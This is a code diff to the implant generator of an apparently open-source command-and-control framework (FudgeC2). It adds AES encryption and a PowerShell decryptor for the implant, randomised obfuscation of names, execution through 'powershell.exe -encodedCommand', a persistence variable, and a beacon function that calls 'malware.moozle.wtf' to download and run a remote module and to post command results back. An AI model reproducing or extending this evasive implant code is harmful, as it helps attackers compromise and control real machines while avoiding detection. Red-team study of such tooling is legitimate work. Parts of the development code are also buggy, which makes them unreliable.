@@ -5,7 +5,9 @@ import base64
 
 from Implant.PSObfucate import PSObfucate
 from Implant.ImplantFunctionality import ImplantFunctionality
+from Implant.payload_encryption import PayloadEncryption
 from NetworkProfiles.NetworkProfileManager import NetworkProfileManager
+
 
 
 class ImplantGenerator:
@@ -16,7 +18,7 @@ class ImplantGenerator:
 
     ImpFunc = ImplantFunctionality()
     NetProfMan = NetworkProfileManager()
-
+    module_obfuscation_string = {}
     JinjaRandomisedArgs = {
         "obf_remote_play_audio": "RemotePlayAudio",
         "obf_sleep": "sleep",
@@ -156,6 +158,8 @@ while($true){
         implant_functions = self.ImpFunc.get_list_of_implant_text()
         implant_functions.extend(core_implant_functions)
 
+
+
         ports = {}
         network_profile_functions = {}
         # -- NEW NETWORK PROFILE CONTENT
@@ -205,6 +209,14 @@ while($true){
         implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
         implant_template, protocol_switch, ports = self._process_modules(implant_data, implant_function_names)
 
+        a = self.ImpFunc.get_obfucation_string_dict()
+        for key in a.keys():
+            letters = string.ascii_lowercase
+            temp_string = ''.join(random.choice(letters) for i in range(8))
+            if temp_string not in a.values():
+                a[key] = temp_string
+        print(a)
+
         callback_url = implant_data['callback_url']
         variable_list = ""
         if implant_data['obfuscation_level'] >= 3:
@@ -218,6 +230,7 @@ while($true){
             uii=implant_data['unique_implant_id'],
             stager_key=implant_data['stager_key'],
             ron=implant_function_names,
+            mod_obf=a,
             beacon=implant_data['beacon'],
             proto_core=protocol_switch,
             obfuscation_level=implant_data['obfuscation_level'],
@@ -230,4 +243,142 @@ while($true){
         f_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
         # 'h; is an alias for history....
         finalised_implant = f"function {f_name}{{ {output_from_parsed_template} }};{f_name}"
+        finalised_implant = self.encrypt_and_wrap_payload(implant_data, finalised_implant)
         return finalised_implant
+
+    def _static_encryption(self, raw_implant):
+        ct = None
+        key = None
+        iv = None
+        encryption_details = PayloadEncryption.encrypt_with_static_aes(raw_implant)
+        powershell_decryption = f'''
+function Create-AesManagedObject($key, $IV) {{
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {{
+        if ($IV.getType().Name -eq "String") {{
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+        }}
+        else {{
+            $aesManaged.IV = $IV
+        }}
+    }}
+    if ($key) {{
+        if ($key.getType().Name -eq "String") {{
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        }}
+        else {{
+            $aesManaged.Key = $key
+        }}
+    }}
+    $aesManaged
+}}
+
+function dcc($key, $iv, $ct){{
+    $byte_ct = [System.Convert]::FromBase64String($ct)
+    $bytes = [System.Convert]::FromBase64String($ct)
+    $aesManaged = Create-AesManagedObject $key $iv
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $aesManaged.Dispose()
+    $unencryptedData.GetType()
+    $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
+    $a
+}}
+$key = "{encryption_details['key']}" 
+$ct = "{encryption_details['ciphertext']}"
+$iv = "{encryption_details['iv']}"
+$ggwp = dcc $key $iv $ct        
+'''
+        print("Encrypting the FudgeC2 payload:")
+
+        # Payload
+        # decryptor
+        # executor
+        return powershell_decryption
+
+    def encrypt_and_wrap_payload(self, implant_config, raw_implant):
+        # Check if encryption is needed:
+        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
+        for encryption_mode in implant_config['encryption']:
+            if encryption_mode == "static_encryption":
+                raw_implant = self._static_encryption(raw_implant)
+        encoded_implant = base64.b64encode(raw_implant.encode()).decode()
+        costructor = f"""{persistence_variable}
+$a = "{encoded_implant}"
+powershell.exe -encodedCommand $a
+"""
+        return costructor
+
+    def _network_encryption(self, data):
+        # DEV WORK FOR PAYLOAD ENCRYPTION
+        # data type == string
+        d = base64.b64encode(data.encode()).decode()
+        id = "abcde"
+
+        network_profile = """
+function connection($b){
+    if ( $b -eq $null ){
+        $URL = "http://"+$url+":1234/index"
+        $r = iwr -uri $URL -headers @{"X-Implant" = "aaaa"} -method 'GET' -UseBasicParsing
+        $global:headers = $r.Content
+    } else {
+        $URL = "http://"+$url+":1234/help"
+        $enc = [system.Text.Encoding]::UTF8
+        $data2 = [System.Convert]::ToBase64String($enc.GetBytes($b))
+        $data2 = $global:command_id+$data2
+        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
+        $global:headers = $r.Content
+    }
+}
+"""
+        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
+
+        data_2 = f"""
+{ persistence_variable }
+$a = "{d}"
+
+function get_key(){{
+    $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($source))
+    $b = [ScriptBlock]::Create($d)
+    #write-host $global:gg
+    New-Module -ScriptBlock $b -Name "aaaa" | Import-Module
+    Get-Command -Module aaaa
+}}
+
+{network_profile}
+
+$url = "malware.moozle.wtf"
+$id = "{id}"
+$awaiting_key = $null
+while ($awaiting_key -ne $null){{
+    connection
+    if ($global:headers -ne "=="){{
+        $awaiting_key == $true
+        
+    }}
+    Start-Sleep 1
+}}
+get_key($global:headers)
+
+"""
+
+        print(data_2)
+        return data_2
+
+# redesign and improvement - Consider the impact of the change to dotnet
+
+# Collect data ( modules, obfuscation key/pairs network, profiles.)
+# Configure anything pre-compile (obfuscation etc)
+# Compile
+# Inject variables
+# Layering
+
+
+
+
+
+
